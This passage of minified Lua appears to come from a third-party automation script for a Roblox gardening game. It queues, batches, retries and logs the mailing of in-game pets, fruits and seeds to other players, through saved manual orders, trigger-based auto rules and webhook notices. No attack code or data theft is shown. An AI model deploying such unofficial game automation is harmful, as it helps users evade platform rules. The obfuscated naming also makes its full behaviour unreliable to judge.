		local V = g.MailUiRefs.RefreshReceipts
		if type(V) == "function" then
			V()
		end
		return true
	end;
	GetReceiptDropdown = function()
		Z.Mail.TrimReceipts()
		local G = {}
		for V, y in ipairs(h.mail_receipts) do
			local Z = y:match("([^\n]+)") or ("Receipt " .. V)
			local j = y:match("To:%s*([^\n]+)") or ""
			table.insert(G, {
				Text = string.format("%s | %s", Z, j),
				Value = tostring(V)
			})
		end
		return G
	end;
	IsSavedManualOrderValid = function(G)
		if type(G) ~= "table" or type(G.id) ~= "string" or G.id == "" or type(G.recipient) ~= "table" or type(G.recipient.userId) ~= "number" or type(G.items) ~= "table" or # G.items == 0 then
			return false
		end
		return true
	end,
	SaveManualOrder = function(G)
		if not Z.Mail.IsSavedManualOrderValid(G) then
			return false
		end
		h.mail_manual_order = G
		a.Save.SaveDataSync()
		return true
	end,
	ClearSavedManualOrder = function()
		h.mail_manual_order = {}
		a.Save.SaveDataSync()
	end,
	ApplyPendingParts = function(G, V)
		if type(G) ~= "table" or type(G.items) ~= "table" or type(V) ~= "table" then
			return false
		end
		for V, y in ipairs(V) do
			local Z = math.floor(tonumber(y.itemIndex) or 0)
			local j = G.items[Z]
			if not j then
				continue
			end
			local i = math.max(math.floor(tonumber(j.amount) or 0), 0)
			local c = math.max(math.floor(tonumber(y.sentBefore) or 0), 0)
			local J = math.max(math.floor(tonumber(y.count) or 0), 0)
			j.sent = math.min(math.max(math.floor(tonumber(j.sent) or 0), c + J), i)
		end
		return true
	end;
	BuildCombinedManualBatch = function(G)
		local V = {}
		local y = {}
		local j = 0
		local i = 0
		local c = Z.Mail.MaxBatchItems
		local J = {}
		if type(G) ~= "table" or type(G.items) ~= "table" then
			return V, y, j, i
		end
		for G, T in ipairs(G.items) do
			local d = math.max(math.floor(tonumber(T.amount) or 0), 0)
			T.sent = math.max(math.floor(tonumber(T.sent) or 0), 0)
			local u = math.max(d - T.sent, 0)
			if u <= 0 then
				continue
			end
			j += 1
			if c <= 0 then
				continue
			end
			local q = Z.Mail.GetAvailableCount(T.category, T.itemName, nil, nil, J, T.fruitMinKg, T.fruitMaxKg, T.fruitMutations, T.fruitVariants, T.fruitMutationBlacklist, T.fruitVariantBlacklist, T.itemKeys, T.itemIds)
			local g = math.min(u, q)
			if not Z.Mail.IsStackCountMailCategory(T.category) then
				g = math.min(g, c)
			end
			if g <= 0 then
				continue
			end
			local E, a = Z.Mail.BuildBatch(T.category, T.itemName, g, nil, nil, J, T.fruitMinKg, T.fruitMaxKg, T.fruitMutations, T.fruitVariants, T.fruitMutationBlacklist, T.fruitVariantBlacklist, T.itemKeys, T.itemIds)
			if a <= 0 then
				continue
			end
			for G, y in ipairs(E) do
				table.insert(V, y)
				if ((y.Category == "Pets" or y.Category == "HarvestedFruits")) and type(y.ItemKey) == "string" then
					J[y.ItemKey] = true
				end
			end
			table.insert(y, {
				itemIndex = G;
				category = T.category,
				itemName = T.itemName,
				count = a,
				beforeCount = q;
				sentBefore = T.sent,
				batch = E,
				mailKey = T.mailKey;
				itemKeys = Z.Mail.CopyStringArrayMail(T.itemKeys);
				itemIds = Z.Mail.CopyStringArrayMail(T.itemIds);
				fruitMinKg = T.fruitMinKg,
				fruitMaxKg = T.fruitMaxKg,
				fruitMutations = T.fruitMutations,
				fruitVariants = T.fruitVariants,
				fruitMutationBlacklist = T.fruitMutationBlacklist;
				fruitVariantBlacklist = T.fruitVariantBlacklist
			})
			i += a
			c -= # E
		end
		return V, y, j, i
	end,
	RunCombinedManualItems = function(G)
		local V = 0
		while g.MailManualRunning and (g.MailActiveOrder == G and G.cancelled ~= true) do
			local y, j, i, c = Z.Mail.BuildCombinedManualBatch(G)
			if i <= 0 then
				return true
			end
			if c <= 0 then
				Z.Mail.SetStatus(G.id .. " | Waiting for remaining items", "#FFCC66")
				Z.Mail.SetManualUiStatus("Waiting for remaining order items", "#FFCC66", "\226\143\179")
				task.wait(2)
				continue
			end
			G.pending = {
				parts = j,
				batch = y
			}
			Z.Mail.SaveManualOrder(G)
			Z.Mail.SetStatus(string.format("%s | Sending %d items together", G.id, c), "#66CCFF")
			Z.Mail.SetManualUiStatus(string.format("Sending %d items from %d order lines to @%s", c, # j, tostring(G.recipient.username or "?")), "#66CCFF", "\240\159\147\164")
			local J, T = Z.Mail.SendBatch(G.recipient, y, string.format("Order %s | Combined %d items", G.id, c), function()
				return g.MailManualRunning and (g.MailActiveOrder == G and G.cancelled ~= true)
			end)
			if J then
				Z.Mail.ApplyPendingParts(G, j)
				G.pending = {}
				V = 0
				Z.Mail.SaveManualOrder(G)
				Z.Mail.RefreshDraftUi()
				Z.Mail.SetManualUiStatus(string.format("Sent %d items together", c), "#7CFC00", "\226\156\133")
			else
				G.pending = {}
				V += 1
				Z.Mail.SaveManualOrder(G)
				if G.cancelled == true or not g.MailManualRunning or g.MailActiveOrder ~= G then
					break
				end
				Z.Mail.SetStatus(string.format("%s | %s", G.id, tostring(T)), "#FF5555")
				Z.Mail.SetManualUiStatus(string.format("Combined send failed. Retrying in %ds", Z.Mail.RetryDelay), "#FF5555", "\226\154\160\239\184\143")
				task.wait(Z.Mail.RetryDelay)
			end
		end
		return false
	end;
	WasPendingBatchSent = function(G)
		if type(G) ~= "table" or type(G.batch) ~= "table" or # G.batch == 0 then
			return false
		end
		if G.category == "Pets" or G.category == "HarvestedFruits" then
			local V = {}
			if G.category == "Pets" then
				local G = Z.Mail.GetInventory()
				local y = G and G.Pets
				if type(y) ~= "table" then
					return false
				end
				for G, y in pairs(y) do
					V[tostring(G)] = true
					if type(y) == "table" and y.Id ~= nil then
						V[tostring(y.Id)] = true
					end
				end
			else
				for G, y in ipairs(Z.Mail.GetBackpackMailFruits()) do
					V[tostring(y.key or "")] = true
					V[tostring(y.id or "")] = true
				end
			end
			for G, y in ipairs(G.batch) do
				if type(y) == "table" and (type(y.ItemKey) == "string" and V[y.ItemKey] == true) then
					return false
				end
			end
			return true
		end
		if not Z.Mail.IsGiftableCategory(G.category) then
			return false
		end
		local V = Z.Mail.GetAvailableCount(G.category, G.itemName, nil, nil, nil, G.fruitMinKg, G.fruitMaxKg, G.fruitMutations, G.fruitVariants, G.fruitMutationBlacklist, G.fruitVariantBlacklist)
		local y = math.max(math.floor(tonumber(G.beforeCount) or 0), 0)
		local j = math.max(math.floor(tonumber(G.count) or 0), 0)
		return j > 0 and V <= y - j
	end,
	ReconcilePendingBatch = function(G)
		local V = type(G) == "table" and G.pending
		if type(V) ~= "table" or next(V) == nil then
			return false
		end
		if type(V.parts) == "table" and # V.parts > 0 then
			local y = true
			for G, V in ipairs(V.parts) do
				if not Z.Mail.WasPendingBatchSent(V) then
					y = false
					break
				end
			end
			if y then
				Z.Mail.ApplyPendingParts(G, V.parts)
			end
			G.pending = {}
			Z.Mail.SaveManualOrder(G)
			return y
		end
		local y = math.floor(tonumber(V.itemIndex) or 0)
		local j = type(G.items) == "table" and G.items[y]
		local i = j and Z.Mail.WasPendingBatchSent(V) or false
		if i then
			local G = math.max(math.floor(tonumber(V.sentBefore) or 0), 0)
			local y = math.max(math.floor(tonumber(V.count) or 0), 0)
			j.sent = math.max(math.floor(tonumber(j.sent) or 0), G + y)
		end
		G.pending = {}
		Z.Mail.SaveManualOrder(G)
		return i
	end;
	RunManualOrder = function(G)
		if g.MailManualRunning or not Z.Mail.IsSavedManualOrderValid(G) then
			return false
		end
		g.MailActiveOrder = G
		g.MailManualRunning = true
		G.state = "running"
		Z.Mail.SaveManualOrder(G)
		Z.Mail.SetManualUiStatus(string.format("Order %s started", G.id), "#66CCFF", "\240\159\147\166")
		Z.Mail.RefreshManualUi()
		Z.Mail.RefreshDraftUi()
		task.spawn(function()
			local V, y = pcall(function()
				Z.Mail.ReconcilePendingBatch(G)
				if G.batchTogether == true then
					Z.Mail.RunCombinedManualItems(G)
					return
				end
				for V, y in ipairs(G.items) do
					y.sent = math.max(math.floor(tonumber(y.sent) or 0), 0)
					local j = {}
					local i = 0
					while g.MailManualRunning and y.sent < y.amount do
						local c = y.amount - y.sent
						local J = Z.Mail.GetOrderItemDisplayName(y)
						local T = Z.Mail.GetAvailableCount(y.category, y.itemName, nil, nil, j, y.fruitMinKg, y.fruitMaxKg, y.fruitMutations, y.fruitVariants, y.fruitMutationBlacklist, y.fruitVariantBlacklist, y.itemKeys, y.itemIds)
						if T <= 0 then
							local V = string.format("Waiting for %d %s", c, J)
							Z.Mail.SetStatus(string.format("%s | %s", G.id, V), "#FFCC66")
							Z.Mail.SetManualUiStatus(V, "#FFCC66", "\226\143\179")
							task.wait(2)
							continue
						end
						local d = T
						local u, q = Z.Mail.BuildBatch(y.category, y.itemName, c, nil, nil, j, y.fruitMinKg, y.fruitMaxKg, y.fruitMutations, y.fruitVariants, y.fruitMutationBlacklist, y.fruitVariantBlacklist, y.itemKeys, y.itemIds)
						if q <= 0 then
							task.wait(2)
							continue
						end
						local E = y.sent + q
						local a = string.format("Order %s | %s | %d/%d", G.id, J, E, y.amount)
						G.pending = {
							itemIndex = V,
							category = y.category;
							itemName = y.itemName;
							count = q,
							beforeCount = d,
							sentBefore = y.sent,
							batch = u;
							mailKey = y.mailKey;
							itemKeys = Z.Mail.CopyStringArrayMail(y.itemKeys);
							itemIds = Z.Mail.CopyStringArrayMail(y.itemIds);
							fruitMinKg = y.fruitMinKg;
							fruitMaxKg = y.fruitMaxKg;
							fruitMutations = y.fruitMutations;
							fruitVariants = y.fruitVariants,
							fruitMutationBlacklist = y.fruitMutationBlacklist;
							fruitVariantBlacklist = y.fruitVariantBlacklist
						}
						Z.Mail.SaveManualOrder(G)
						Z.Mail.SetStatus(string.format("%s | Sending %s %d/%d", G.id, J, E, y.amount), "#66CCFF")
						Z.Mail.SetManualUiStatus(string.format("Sending %s %d/%d to @%s", J, E, y.amount, tostring(G.recipient.username or "?")), "#66CCFF", "\240\159\147\164")
						local H, r = Z.Mail.SendBatch(G.recipient, u, a, function()
							return g.MailManualRunning and (g.MailActiveOrder == G and G.cancelled ~= true)
						end)
						if H then
							if G.cancelled == true or not g.MailManualRunning or g.MailActiveOrder ~= G then
								G.pending = {}
								break
							end
							y.sent = E
							G.pending = {}
							i = 0
							for G, V in ipairs(u) do
								if V.Category == "Pets" or V.Category == "HarvestedFruits" then
									j[V.ItemKey] = true
								end
							end
							Z.Mail.SaveManualOrder(G)
							Z.Mail.RefreshDraftUi()
							Z.Mail.SetManualUiStatus(string.format("Sent %s %d/%d", J, y.sent, y.amount), "#7CFC00", "\226\156\133")
							Z.Mail.WaitForInventoryChange(y.category, y.itemName, d, nil, nil, y.fruitMinKg, y.fruitMaxKg, y.fruitMutations, y.fruitVariants, y.fruitMutationBlacklist, y.fruitVariantBlacklist, y.itemKeys, y.itemIds)
						else
							if G.cancelled == true or not g.MailManualRunning or g.MailActiveOrder ~= G then
								G.pending = {}
								break
							end
							G.pending = {}
							i += 1
							Z.Mail.SaveManualOrder(G)
							Z.Mail.SetStatus(string.format("%s | %s", G.id, tostring(r)), "#FF5555")
							Z.Mail.SetManualUiStatus(string.format("Send failed. Retrying in %ds", Z.Mail.RetryDelay), "#FF5555", "\226\154\160\239\184\143")
							if i >= Z.Mail.MaxFailures then
								i = 0
							end
							task.wait(Z.Mail.RetryDelay)
						end
					end
					if not g.MailManualRunning then
						break
					end
				end
			end)
			if not V then
				warn("[Mail] Manual order error:", y)
				g.MailManualRunning = false
				g.MailActiveOrder = nil
				G.state = "resume"
				Z.Mail.SaveManualOrder(G)
				Z.Mail.SetStatus("Order paused: it will resume when the script starts again", "#FF4444")
				Z.Mail.SetManualUiStatus("Paused. The order will resume when the script starts again", "#FF5555", "\226\154\160\239\184\143")
				Z.Mail.RefreshManualUi()
				return
			end
			if not g.MailManualRunning then
				g.MailActiveOrder = nil
				Z.Mail.RefreshManualUi()
				return
			end
			Z.Mail.AddReceipt(Z.Mail.BuildReceipt(G))
			Z.Webhooks.QueueMail("manual", {
				orderId = tostring(G.id or "Unknown");
				recipient = G.recipient and G.recipient.username or "Unknown";
				items = Z.Webhooks.CopyMailItems(G.items)
			})
			if Z.WebMailOrder and type(Z.WebMailOrder.CompleteWebMailOrder) == "function" then
				Z.WebMailOrder.CompleteWebMailOrder(G)
			end
			Z.Mail.ClearSavedManualOrder()
			table.clear(g.MailDraftItems)
			Z.Mail.RefreshDraftUi()
			g.MailManualRunning = false
			g.MailActiveOrder = nil
			Z.Mail.SetStatus(G.id .. " delivered", "#7CFC00")
			Z.Mail.SetManualUiStatus(string.format("Completed %s to @%s", G.id, tostring(G.recipient.username or "?")), "#7CFC00", "\226\156\133")
			Z.Mail.RefreshManualUi()
			g.Notify("Order delivered: " .. G.id, 4)
		end)
		return true
	end,
	StartManualOrder = function(G)
		if g.MailManualRunning then
			return false, "An order is already running"
		end
		if Z.Mail.IsSavedManualOrderValid(h.mail_manual_order) then
			local G = Z.Mail.RunManualOrder(h.mail_manual_order)
			return G, G and "Resumed " .. tostring(h.mail_manual_order.id) or "Could not resume the saved order"
		end
		if # g.MailDraftItems == 0 then
			return false, "Add at least one item"
		end
		local V, y = Z.Mail.LookupRecipient(G)
		if not V then
			return false, y
		end
		local j = {
			version = 1,
			id = Z.Mail.MakeId("EXO");
			recipient = V,
			items = Z.Mail.CloneDraftItems();
			pending = {};
			startedAt = os.time(),
			state = "running",
			batchTogether = h.mail_manual_batch_together == true
		}
		Z.Mail.SaveManualOrder(j)
		if not Z.Mail.RunManualOrder(j) then
			return false, "Could not start the order"
		end
		return true, "Started " .. j.id
	end,
	ResumeManualOrder = function()
		if g.MailManualRunning then
			return false
		end
		local G = h.mail_manual_order
		if not Z.Mail.IsSavedManualOrderValid(G) then
			return false
		end
		if G.source == "web" then
			return false
		end
		Z.Mail.SetStatus("Resuming saved order " .. tostring(G.id), "#66CCFF")
		Z.Mail.SetManualUiStatus("Resuming saved order " .. tostring(G.id), "#66CCFF", "\240\159\148\132")
		return Z.Mail.RunManualOrder(G)
	end,
	StopManualOrder = function()
		if not g.MailManualRunning and not Z.Mail.IsSavedManualOrderValid(h.mail_manual_order) then
			return false
		end
		local G = g.MailActiveOrder
		if type(G) == "table" then
			G.cancelled = true
		end
		g.MailManualRunning = false
		g.MailActiveOrder = nil
		Z.Mail.ClearSavedManualOrder()
		Z.Mail.RefreshDraftUi()
		Z.Mail.SetStatus("Manual order stopped", "#FF7777")
		Z.Mail.SetManualUiStatus("Order stopped", "#FF7777", "\226\143\185\239\184\143")
		Z.Mail.RefreshManualUi()
		return true
	end;
	AddRule = function(G, V, y, j, i, c, J, T, d, u, q, E, H)
		if type(G) ~= "table" or type(G.userId) ~= "number" then
			return false, "Invalid recipient"
		end
		V, y = Z.Mail.DecodeItemSelection(V, y)
		if not Z.Mail.IsGiftableCategory(V) then
			return false, "Select a category"
		end
		if type(y) ~= "string" or y == "" then
			return false, "Select an item"
		end
		j = math.floor(tonumber(j) or 0)
		i = math.floor(tonumber(i) or 0)
		if j <= 0 or i <= 0 then
			return false, "Trigger and send amounts must be above 0"
		end
		local r, Y, e, s, N, W, X
		if V == "HarvestedFruits" then
			r, Y, e, s, N, W, X = Z.Mail.NormaliseFruitFilters(T, d, u, q, E, H)
			if e then
				return false, e
			end
		end
		if type(h.mail_auto_rules) ~= "table" then
			h.mail_auto_rules = {}
		end
		local l = Z.Mail.MakeId("RULE")
		h.mail_auto_rules[l] = {
			id = l,
			enabled = true;
			targetUserId = G.userId,
			targetUsername = G.username;
			targetDisplayName = G.displayName;
			category = V,
			itemName = y,
			triggerAmount = j;
			sendAmount = i,
			petTypes = type(c) == "table" and c or {},
			petSizes = type(J) == "table" and J or {},
			fruitMinKg = r,
			fruitMaxKg = Y;
			fruitMutations = s or {};
			fruitVariants = N or {};
			fruitMutationBlacklist = W or {},
			fruitVariantBlacklist = X or {};
			filterKey = V == "HarvestedFruits" and Z.Mail.GetFruitFilterKey(r, Y, s, N) or ""
		}
		a.Save.SaveDataSync()
		local B = g.MailUiRefs.RefreshRules
		if type(B) == "function" then
			B()
		end
		return true, l
	end;
	RemoveRule = function(G)
		local V = h.mail_auto_rules
		local y = type(V) == "table" and V[G]
		if type(y) ~= "table" then
			return false
		end
		y.enabled = false
		V[G] = nil
		Z.Mail.RuleCooldowns[G] = nil
		a.Save.SaveDataSync()
		local j = g.MailUiRefs.RefreshRules
		if type(j) == "function" then
			j()
		end
		return true
	end,
	ToggleRule = function(G)
		local V = type(h.mail_auto_rules) == "table" and h.mail_auto_rules[G]
		if type(V) ~= "table" then
			return false
		end
		V.enabled = V.enabled ~= true
		a.Save.SaveDataSync()
		local y = g.MailUiRefs.RefreshRules
		if type(y) == "function" then
			y()
		end
		return true, V.enabled
	end,
	GetRuleDropdown = function()
		local G = {}
		local V = type(h.mail_auto_rules) == "table" and h.mail_auto_rules or {}
		local y = {}
		for G, V in pairs(V) do
			if type(G) == "string" and type(V) == "table" then
				table.insert(y, G)
			end
		end
		table.sort(y)
		for y, j in ipairs(y) do
			local i = V[j]
			local c = Z.Mail.GetItemDisplayName(i.category, i.itemName) .. Z.Mail.GetFruitFilterText(i)
			local J = i.enabled == true and "ON" or "OFF"
			table.insert(G, {
				Text = string.format("%s | %s | %s x%d at %d | @%s", J, j, c, tonumber(i.sendAmount) or 0, tonumber(i.triggerAmount) or 0, tostring(i.targetUsername or "?"));
				Value = j
			})
		end
		return G
	end;
	GetSimpleMailPlan = function()
		if type(l.gag2_simple_mail) == "table" then
			return l.gag2_simple_mail
		end
		local G = l.gag2_config
		if type(G) == "table" and type(G.gag2_simple_mail) == "table" then
			return G.gag2_simple_mail
		end
		return nil
	end;
	GetSimpleMailSortedKeys = function(G)
		local V = {}
		if type(G) ~= "table" then
			return V
		end
		for G in pairs(G) do
			table.insert(V, G)
		end
		table.sort(V, function(G, V)
			return tostring(G) < tostring(V)
		end)
		return V
	end,
	GetSimpleMailCategory = function(G)
		local V = tostring(G or "")
		local y = V:gsub("%s+", "")
		local j = y:lower()
		local i = {
			fruit = "HarvestedFruits",
			fruits = "HarvestedFruits";
			harvestedfruit = "HarvestedFruits",
			harvestedfruits = "HarvestedFruits",
			fruitvariant = "FruitVariants",
			fruitvariants = "FruitVariants",
			seed = "Seeds";
			seeds = "Seeds",
			pet = "Pets",
			pets = "Pets",
			egg = "Eggs",
			eggs = "Eggs",
			sprinkler = "Sprinklers";
			sprinklers = "Sprinklers";
			wateringcan = "WateringCans";
			wateringcans = "WateringCans";
			mushroom = "Mushrooms",
			mushrooms = "Mushrooms",
			gnome = "Gnomes",
			gnomes = "Gnomes",
			raccoon = "Raccoons",
			raccoons = "Raccoons",
			trowel = "Trowels";
			trowels = "Trowels",
			seedpack = "SeedPacks";
			seedpacks = "SeedPacks";
			crate = "Crates",
			crates = "Crates";
			prop = "Props",
			props = "Props";
			emptypot = "EmptyPots",
			emptypots = "EmptyPots";
			powerhose = "PowerHoses",
			powerhoses = "PowerHoses"
		}
		local c = i[j]
		if c then
			return c
		end
		if Z.Mail.IsGiftableCategory(V) then
			return V
		end
		if Z.Mail.IsGiftableCategory(y) then
			return y
		end
		return nil
	end,
	IsSimpleMailAll = function(G)
		return type(G) == "string" and G:lower() == "all"
	end;
	GetSimpleMailAmount = function(G)
		local V = G
		if type(G) == "table" then
			V = G.Amount
			if V == nil then
				V = G.amount
			end
		end
		if Z.Mail.IsSimpleMailAll(V) then
			return true, 1
		end
		local y = math.max(math.floor(tonumber(V) or 0), 0)
		if y <= 0 then
			return false, 0
		end
		return false, y
	end;
	GetSimpleMailField = function(G, V, y)
		if type(G) ~= "table" then
			return y
		end
		local Z = G[V]
		if Z == nil then
			return y
		end
		return Z
	end;
	GetSimpleMailSelection = function(G, V)
		local y = Z.Mail.GetSimpleMailField(G, V, nil)
		if type(y) == "table" then
			return Z.Mail.CopySelection(y)
		end
		if type(y) == "string" and y ~= "" then
			return {
				[y] = true
			}
		end
		return {}
	end,
	GetSimpleMailFruitSettings = function(G)
		return {
			minKg = tonumber(Z.Mail.GetSimpleMailField(G, "MinKg", 0)) or 0;
			maxKg = tonumber(Z.Mail.GetSimpleMailField(G, "MaxKg", 100000000)) or 100000000,
			mutations = Z.Mail.GetSimpleMailSelection(G, "Mutations"),
			variants = Z.Mail.GetSimpleMailSelection(G, "Variants");
			mutationBlacklist = Z.Mail.GetSimpleMailSelection(G, "MutationBlacklist");
			variantBlacklist = Z.Mail.GetSimpleMailSelection(G, "VariantBlacklist")
		}
	end;
	ResolveSimpleMailPetName = function(G)
		G = tostring(G or "")
		if G == "" or type(y.PetData) ~= "table" then
			return G
		end
		if type(y.PetData[G]) == "table" then
			return G
		end
		for V, y in pairs(y.PetData) do
			if type(V) == "string" and (type(y) == "table" and tostring(y.DisplayName or "") == G) then
				return V
			end
		end
		return G
	end,
	BuildSimpleMailCategoryBatch = function(G, V, y, j, i)
		local c = {}
		local J, T = Z.Mail.GetSimpleMailAmount(y)
		if T <= 0 or i <= 0 then
			return c, 0
		end
		local d = {}
		local u = {}
		local q = nil
		local g = 0
		if G == "Pets" then
			V = Z.Mail.ResolveSimpleMailPetName(V)
			d = Z.Mail.GetSimpleMailSelection(y, "Variants")
			u = Z.Mail.GetSimpleMailSelection(y, "Sizes")
			g = Z.Mail.GetAvailableCount(G, V, d, u, j)
		elseif G == "HarvestedFruits" then
			q = Z.Mail.GetSimpleMailFruitSettings(y)
			g = Z.Mail.GetAvailableCount(G, V, nil, nil, j, q.minKg, q.maxKg, q.mutations, q.variants, q.mutationBlacklist, q.variantBlacklist)
		else
			if not Z.Mail.IsGiftableCategory(G) then
				return c, 0
			end
			g = Z.Mail.GetAvailableCount(G, V)
		end
		if g <= 0 then
			return c, 0
		end
		if not J and g < T then
			return c, 0
		end
		local E = g
		if not J then
			E = T
		end
		if not Z.Mail.IsStackCountMailCategory(G) then
			E = math.min(E, i)
		end
		if G == "HarvestedFruits" then
			return Z.Mail.BuildBatch(G, V, E, nil, nil, j, q.minKg, q.maxKg, q.mutations, q.variants, q.mutationBlacklist, q.variantBlacklist)
		end
		return Z.Mail.BuildBatch(G, V, E, d, u, j)
	end,
	GetSimpleMailVariantFruits = function(G, V, y)
		local j = {}
		G = tostring(G or "")
		if not Z.FruitFilters.IsKnownVariant(G) then
			return j
		end
		local i = Z.Mail.GetSimpleMailFruitSettings(V)
		Z.Mail.CleanupRecentlySentFruits()
		for V, c in ipairs(Z.Mail.GetBackpackMailFruits()) do
			if type(y) == "table" and ((y[c.key] or y[c.id])) then
				continue
			end
			if Z.Mail.RecentlySentFruits[c.key] or Z.Mail.RecentlySentFruits[c.id] then
				continue
			end
			local J = c.data
			if type(J) ~= "table" or J.has_weight == false or c.weight <= 0 then
				continue
			end
			if not Z.FruitFilters.PassesWeightRange(c.weight, i.minKg, i.maxKg) then
				continue
			end
			local T, d = Z.FruitFilters.GetMutationLookup(J)
			if not Z.FruitFilters.PassesMutationSelection(d, i.mutations, i.mutationBlacklist) then
				continue
			end
			local u = Z.FruitFilters.GetFruitVariant(J, d)
			if u ~= G then
				continue
			end
			if not Z.FruitFilters.PassesVariantSelection(u, i.variants, i.variantBlacklist) then
				continue
			end
			table.insert(j, c)
		end
		return j
	end,
	BuildSimpleMailVariantBatch = function(G, V, y, j)
		local i = {}
		local c, J = Z.Mail.GetSimpleMailAmount(V)
		if J <= 0 or j <= 0 then
			return i, 0
		end
		local T = Z.Mail.GetSimpleMailVariantFruits(G, V, y)
		local d = # T
		if d <= 0 then
			return i, 0
		end
		if not c and d < J then
			return i, 0
		end
		local u = math.min(d, j)
		if not c then
			u = math.min(J, j)
		end
		for G = 1, u, 1 do
			table.insert(i, {
				Category = "HarvestedFruits";
				ItemKey = T[G].key;
				Count = 1
			})
		end
		return i, u
	end;
	BuildSimpleMailPlanBatch = function(G)
		local V = {}
		local y = {}
		local j = {}
		local i = Z.Mail.MaxBatchItems
		if type(G) ~= "table" then
			return V, y, 0
		end
		for c, J in ipairs(Z.Mail.GetSimpleMailSortedKeys(G)) do
			if i <= 0 then
				break
			end
			local T = G[J]
			if type(T) ~= "table" then
				continue
			end
			local d = Z.Mail.GetSimpleMailCategory(J)
			if not d then
				continue
			end
			for G, c in ipairs(Z.Mail.GetSimpleMailSortedKeys(T)) do
				if i <= 0 then
					break
				end
				local J = {}
				local u = 0
				local q = T[c]
				if d == "FruitVariants" then
					J, u = Z.Mail.BuildSimpleMailVariantBatch(c, q, j, i)
				else
					J, u = Z.Mail.BuildSimpleMailCategoryBatch(d, tostring(c), q, j, i)
				end
				if u <= 0 or # J <= 0 then
					continue
				end
				for G, y in ipairs(J) do
					table.insert(V, y)
					if y.Category == "Pets" or y.Category == "HarvestedFruits" then
						j[y.ItemKey] = true
					end
				end
				local g = d
				local E = Z.Mail.GetItemDisplayName(g, tostring(c))
				if d == "FruitVariants" then
					g = "HarvestedFruits"
					E = tostring(c) .. " fruits"
				end
				table.insert(y, {
					category = g,
					name = E;
					count = u
				})
				i -= # J
			end
		end
		local c = 0
		for G, V in ipairs(y) do
			c += math.max(math.floor(tonumber(V.count) or 0), 0)
		end
		return V, y, c
	end;
	ProcessSimpleMailPlan = function()
		local G = Z.Mail.GetSimpleMailPlan()
		if type(G) ~= "table" then
			return 0, false
		end
		for V, y in ipairs(Z.Mail.GetSimpleMailSortedKeys(G)) do
			local j = Z.Mail.CleanUsername(y)
			if j == "" then
				continue
			end
			local i = "simple::" .. j
			local c = tonumber(Z.Mail.RuleCooldowns[i]) or 0
			if os.clock() < c then
				continue
			end
			local J, T, d = Z.Mail.BuildSimpleMailPlanBatch(G[y])
			if # J <= 0 or d <= 0 then
				continue
			end
			local u, q = Z.Mail.LookupRecipient(j)
			if not u then
				Z.Mail.RuleCooldowns[i] = os.clock() + Z.Mail.RetryDelay
				Z.Mail.SetStatus("Simple mail user error: " .. tostring(q), "#FF5555")
				return 0, true
			end
			Z.Mail.SetStatus(string.format("Simple mail | Sending %d items to @%s", d, u.username), "#66CCFF")
			local g, E = Z.Mail.SendBatch(u, J, "Simple mail", nil, true)
			if not g then
				Z.Mail.RuleCooldowns[i] = os.clock() + Z.Mail.RetryDelay
				Z.Mail.SetStatus("Simple mail failed: " .. tostring(E), "#FF5555")
				return 0, true
			end
			Z.Webhooks.QueueMail("automatic", {
				ruleId = "Simple Mail";
				recipient = u.username;
				items = T
			})
			Z.Mail.SetStatus(string.format("Simple mail | Sent %d items to @%s", d, u.username), "#7CFC00")
			return d, true
		end
		return 0, false
	end,
	ProcessCombinedAutoRules = function(G, V)
		local y
		local j = {}
		local i = {}
		local c = {}
		local J = {}
		local T = Z.Mail.MaxBatchItems
		for V, d in ipairs(V) do
			if T <= 0 then
				break
			end
			local u = G[d]
			local q = tonumber(Z.Mail.RuleCooldowns[d]) or 0
			if type(u) ~= "table" or u.enabled ~= true or os.clock() < q then
				continue
			end
			local g = tonumber(u.targetUserId)
			if not g or g <= 0 then
				u.enabled = false
				a.Save.SaveDataSync()
				continue
			end
			if y and y.userId ~= g then
				continue
			end
			local E = tostring(u.category) .. ("::" .. (tostring(u.itemName) .. ("::" .. tostring(u.filterKey or ""))))
			local H = math.max(math.floor(tonumber(u.triggerAmount) or 1), 1)
			local r = math.max(math.floor(tonumber(u.sendAmount) or 1), 1)
			local Y = Z.Mail.GetAvailableCount(u.category, u.itemName, u.petTypes, u.petSizes, nil, u.fruitMinKg, u.fruitMaxKg, u.fruitMutations, u.fruitVariants, u.fruitMutationBlacklist, u.fruitVariantBlacklist)
			if Y < H then
				continue
			end
			local e = Y
			if u.category == "Pets" or u.category == "HarvestedFruits" then
				e = Z.Mail.GetAvailableCount(u.category, u.itemName, u.petTypes, u.petSizes, c, u.fruitMinKg, u.fruitMaxKg, u.fruitMutations, u.fruitVariants, u.fruitMutationBlacklist, u.fruitVariantBlacklist)
			else
				e = math.max(Y - ((J[E] or 0)), 0)
			end
			if e <= 0 then
				continue
			end
			local s = math.min(r, e)
			if not Z.Mail.IsStackCountMailCategory(u.category) then
				s = math.min(s, T)
			end
			local N, W = Z.Mail.BuildBatch(u.category, u.itemName, s, u.petTypes, u.petSizes, c, u.fruitMinKg, u.fruitMaxKg, u.fruitMutations, u.fruitVariants, u.fruitMutationBlacklist, u.fruitVariantBlacklist)
			if W <= 0 then
				continue
			end
			y = y or {
				userId = g;
				username = tostring(u.targetUsername or "");
				displayName = tostring(u.targetDisplayName or u.targetUsername or "")
			}
			for G, V in ipairs(N) do
				table.insert(j, V)
				if ((V.Category == "Pets" or V.Category == "HarvestedFruits")) and type(V.ItemKey) == "string" then
					c[V.ItemKey] = true
				end
			end
			if u.category ~= "Pets" and u.category ~= "HarvestedFruits" then
				J[E] = ((J[E] or 0)) + W
			end
			table.insert(i, {
				ruleId = d;
				rule = u;
				count = W
			})
			T -= # N
		end
		if not y or # j == 0 or # i == 0 then
			return 0
		end
		Z.Mail.SetStatus(string.format("Auto | Sending %d items from %d rules to @%s", # j, # i, y.username), "#66CCFF")
		local d, u = Z.Mail.SendBatch(y, j, string.format("Auto combined | %d rules", # i), nil, true)
		if not d then
			for G, V in ipairs(i) do
				Z.Mail.RuleCooldowns[V.ruleId] = os.clock() + Z.Mail.RetryDelay
			end
			Z.Mail.SetStatus("Auto combined send failed: " .. tostring(u), "#FF5555")
			return 0
		end
		local q = 0
		local g = {}
		local E = {}
		for G, V in ipairs(i) do
			local y = V.rule
			local j = math.max(math.floor(tonumber(V.count) or 0), 0)
			local i = tostring(y.category) .. ("::" .. (tostring(y.itemName) .. ("::" .. tostring(y.filterKey or ""))))
			q += j
			Z.Mail.RuleCooldowns[V.ruleId] = os.clock() + 5
			local c = E[i]
			if not c then
				c = {
					category = y.category;
					name = Z.Mail.GetItemDisplayName(y.category, y.itemName) .. Z.Mail.GetFruitFilterText(y),
					count = 0
				}
